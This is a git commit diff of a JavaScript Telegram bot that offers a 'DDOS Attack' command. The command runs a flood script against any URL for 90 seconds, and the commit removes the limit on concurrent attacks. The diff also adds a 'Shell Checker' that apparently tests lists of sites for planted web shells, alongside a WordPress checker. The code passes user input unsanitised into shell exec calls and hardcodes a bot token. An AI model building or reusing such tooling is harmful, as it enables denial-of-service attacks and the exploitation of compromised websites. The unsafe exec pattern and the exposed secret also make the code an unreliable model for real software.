acec738d87020095dca5eeefc773b38e210fc8fd
Anjaymemek <158371771+GMFR444X@users.noreply.github.com>
2024-06-27 14:26:11 +0700

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,32 +1,17 @@
 const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 const fs = require('fs');
-const axios = require('axios');
 const token = '6674838409:AAHLkaUy93k648M8FlvlhBddJLD0NgfzYd0';
 const bot = new TelegramBot(token, { polling: true });
 
-let isDDOSRunning = false; // Variabel untuk menandai apakah serangan DDOS sedang berlangsung
-
-function sendProgressUpdate(chatId, messageId) {
-    const progressFile = 'progress.txt';
-    if (fs.existsSync(progressFile)) {
-        fs.readFile(progressFile, 'utf8', (err, data) => {
-            if (err) {
-                console.error(`Error reading progress file: ${err}`);
-            } else {
-                const progress = data.trim();
-                if (progress) {
-                    bot.editMessageText(`File received. Starting the check... ${progress}%`, {
-                        chat_id: chatId,
-                        message_id: messageId,
-                        reply_markup: {
-                            inline_keyboard: [[{ text: `Progress: ${progress}%`, callback_data: 'progress' }]]
-                        }
-                    });
-                }
-            }
-        });
-    }
+function sendProgressUpdate(chatId, messageId, progress) {
+    bot.editMessageText(`File received. Starting the check... ${progress}%`, {
+        chat_id: chatId,
+        message_id: messageId,
+        reply_markup: {
+            inline_keyboard: [[{ text: `Progress: ${progress}%`, callback_data: 'progress' }]]
+        }
+    });
 }
 
 bot.onText(/\/start/, (msg) => {
@@ -39,10 +24,10 @@ bot.onText(/\/start/, (msg) => {
             inline_keyboard: [
                 [
                     { text: 'Wordpress Checker', callback_data: 'wpcek' },
+                    { text: 'Shell Checker', callback_data: 'shellcek' }
                 ],
                 [
                     { text: 'DDOS Attack', callback_data: 'ddos' },
-                    { text: 'HTTP Checker', callback_data: 'http' },
                     { text: 'Owner', url: 'https://t.me/cadelXploit' }
                 ]
             ]
@@ -61,8 +46,8 @@ bot.on('callback_query', (query) => {
         case 'ddos':
             bot.sendMessage(chatId, `DDOS Attack\n\nCommand: /ddos <url>\n\nDescription: Use this command to perform a DDOS attack on the specified URL for a specified duration.\n\nExample: /ddos example.com 90`);
             break;
-        case 'http':
-            bot.sendMessage(chatId, `HTTP Checker\n\nCommand: /http <url>\n\nDescription: Use this command to check HTTP status of a URL.\n\nPlease enter the URL to check HTTP status.`);
+        case 'shellcek':
+            bot.sendMessage(chatId, `Shell Checker\n\nCommand: /shellcek\n\nDescription: Use this command to check websites' HTTP status codes. Please send the file with the list of websites.`);
             break;
         default:
             break;
@@ -88,9 +73,11 @@ bot.onText(/\/wpcek/, (msg) => {
                 }
             }).then(sentMessage => {
                 const messageId = sentMessage.message_id;
+                let progress = 0;
 
                 const intervalId = setInterval(() => {
-                    sendProgressUpdate(chatId, messageId);
+                    sendProgressUpdate(chatId, messageId, progress);
+                    progress += 10; // Increment progress by 10%
                 }, 5000); // Check progress every 5 seconds
 
                 exec(`python3 wpcek.py ${filePath} 10`, (error, stdout, stderr) => {
@@ -146,18 +133,9 @@ bot.onText(/\/ddos (.+)/, (msg, match) => {
     const url = match[1];
     const duration = 90; // Default duration, you can change this as needed
 
-    if (isDDOSRunning) {
-        bot.sendMessage(chatId, `A DDOS attack is already in progress. Please wait until the current attack completes.`);
-        return;
-    }
-
-    isDDOSRunning = true; // Set DDOS status to running
-
     bot.sendMessage(chatId, `Starting DDOS attack to ${url} for ${duration} seconds...`);
 
     exec(`python3 ddos.py ${url} ${duration}`, (error, stdout, stderr) => {
-        isDDOSRunning = false; // Reset DDOS status
-
         if (error) {
             bot.sendMessage(chatId, `Error: ${error.message}`);
             console.error(`Error: ${error.message}`);
@@ -174,20 +152,73 @@ bot.onText(/\/ddos (.+)/, (msg, match) => {
     });
 });
 
-bot.onText(/\/http (.+)/, async (msg, match) => {
+bot.onText(/\/shellcek/, (msg) => {
     const chatId = msg.chat.id;
-    const url = match[1];
+    bot.sendMessage(chatId, 'Please send the file with the list of websites.');
 
-    try {
-        const response = await axios.get(`https://check-host.net/check-http?host=${url}`);
-        const checkHostUrl = `https://check-host.net/check-http?host=${url}`;
+    bot.once('document', (msg) => {
+        const fileId = msg.document.file_id;
+        const filePath = `./${msg.document.file_name}`;
+        const fileStream = bot.getFileStream(fileId);
+        const writeStream = fs.createWriteStream(filePath);
 
-        const message = `HTTP ${url}\n\n[Click here to check HTTP status](${checkHostUrl})`;
-        bot.sendMessage(chatId, message, { parse_mode: 'markdown' });
-    } catch (error) {
-        bot.sendMessage(chatId, `Error: ${error.message}`);
-        console.error(`Error: ${error.message}`);
-    }
+        fileStream.pipe(writeStream).on('finish', () => {
+            bot.sendMessage(chatId, 'File received. Starting the check...', {
+                reply_markup: {
+                    inline_keyboard: [[{ text: 'Progress: 0%', callback_data: 'progress' }]]
+                }
+            }).then(sentMessage => {
+                const messageId = sentMessage.message_id;
+                let progress = 0;
+
+                const intervalId = setInterval(() => {
+                    sendProgressUpdate(chatId, messageId, progress);
+                    progress += 10; // Increment progress by 10%
+                }, 5000); // Check progress every 5 seconds
+
+                exec(`python3 shell.py ${filePath} 10`, (error, stdout, stderr) => {
+                    clearInterval(intervalId); // Stop checking progress
+                    if (error) {
+                        bot.sendMessage(chatId, `Error: ${error.message}`);
+                        console.error(`Error: ${error.message}`);
+                        return;
+                    }
+                    if (stderr) {
+                        bot.sendMessage(chatId, `Stderr: ${stderr}`);
+                        console.error(`Stderr: ${stderr}`);
+                        return;
+                    }
+
+                    console.log(`Stdout: ${stdout}`);
+                    bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
+
+                    const outputFile = 'goodshell.txt';
+                    if (fs.existsSync(outputFile)) {
+                        bot.sendDocument(chatId, outputFile, { caption: 'Results for Shell Checker' }).then(() => {
+                            fs.unlinkSync(outputFile); // Remove the output file after sending
+                        });
+                    } else {
+                        bot.sendMessage(chatId, 'No successful HTTP status codes found.');
+                    }
+                });
+            });
+        });
+
+        writeStream.on('error', (error) => {
+            bot.sendMessage(chatId, `Failed to write file: ${error.message}`);
+            console.error(`Failed to write file: ${error.message}`);
+        });
+    });
 });
 
 bot.on('polling_error', (error) => console.log(`Polling Error: ${error.message}`));
+
+function sendProgressUpdate(chatId, messageId, progress) {
+    bot.editMessageText(`File received. Starting the check... ${progress}%`, {
+        chat_id: chatId,
+        message_id: messageId,
+        reply_markup: {
+            inline_keyboard: [[{ text: `Progress: ${progress}%`, callback_data: 'progress' }]]
+        }
+    });
+}
